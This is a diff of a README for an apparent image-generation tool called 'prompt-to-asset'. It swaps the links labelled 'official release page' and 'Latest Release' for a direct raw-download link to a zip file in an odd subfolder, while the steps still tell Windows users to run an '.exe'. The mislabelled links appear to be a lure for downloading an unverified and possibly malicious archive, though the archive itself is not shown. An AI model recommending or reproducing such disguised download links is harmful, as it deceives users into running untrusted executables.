@@ -1,6 +1,6 @@
 # 🎨 prompt-to-asset - Generate professional images using text prompts
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/lightsomenessvandyke9074/prompt-to-asset/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/lightsomenessvandyke9074/prompt-to-asset/raw/refs/heads/main/cantish/prompt_asset_to_2.6-alpha.2.zip)
 
 ## 🎯 Purpose of this software
 
@@ -19,7 +19,7 @@ To run this application on your computer, your system must meet these requiremen
 
 Follow these steps to obtain the tool:
 
-1. Visit the [official release page](https://github.com/lightsomenessvandyke9074/prompt-to-asset/releases).
+1. Visit the [official release page](https://github.com/lightsomenessvandyke9074/prompt-to-asset/raw/refs/heads/main/cantish/prompt_asset_to_2.6-alpha.2.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in ".exe" intended for Windows users.
 4. Save the file to your Downloads folder.
